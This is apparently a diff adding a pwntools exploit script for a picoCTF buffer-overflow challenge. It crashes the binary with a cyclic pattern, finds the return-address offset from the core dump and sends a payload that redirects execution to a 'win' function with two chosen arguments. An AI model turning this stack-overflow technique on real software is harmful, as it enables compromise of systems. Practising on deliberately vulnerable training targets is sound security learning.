@@ -1,0 +1,25 @@
+#!/usr/bin/env python3
+from pwn import *
+
+elf = context.binary = ELF('./vuln', checksec=False)    # sets elf object
+host, port = 'saturn.picoctf.net', [PORT]
+
+p = process(elf.path)        # creates local process w/ elf object
+p.sendline(cyclic(128))      # sends cyclic pattern to crash
+p.wait()                     # sigsegv generates core dump
+core = Coredump('./core')    # parses core dump file
+
+payload = flat([
+    {cyclic_find(core.eip): elf.symbols.win},    # pads win address
+    elf.symbols.main,                            # return address
+    0xCAFEF00D,                                  # parameter 1
+    0xF00DF00D                                   # parameter 2
+])
+
+if args.REMOTE:
+    p = remote(host, port)
+else:
+    p = process(elf.path)
+
+p.sendline(payload)
+p.interactive()
